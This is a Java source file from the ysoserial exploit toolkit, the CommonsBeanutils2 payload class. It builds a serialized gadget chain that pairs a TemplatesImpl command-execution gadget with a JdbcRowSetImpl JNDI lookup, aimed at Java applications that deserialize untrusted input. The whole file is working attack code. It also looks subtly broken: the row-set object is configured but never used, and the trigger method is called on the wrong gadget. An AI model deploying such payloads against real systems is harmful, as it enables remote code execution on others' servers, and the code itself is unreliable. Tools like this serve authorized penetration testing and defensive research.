package ysoserial.payloads;

import java.math.BigInteger;
import java.util.PriorityQueue;

import org.apache.commons.beanutils.BeanComparator;

import com.sun.rowset.JdbcRowSetImpl;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
@Authors({ Authors.FROHOFF })
public class CommonsBeanutils2 implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
		return makeJNDI(command);
	}

	static public Object makeJNDI(final String command) throws Exception {
		final Object gadget = Gadgets.createTemplatesImpl(command);
		JdbcRowSetImpl rs = new JdbcRowSetImpl();
		rs.setDataSourceName(command);
		return CommonsBeanutils1.makeTrigger(gadget, "getDatabaseMetaData");
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutils2.class, args);
	}
}
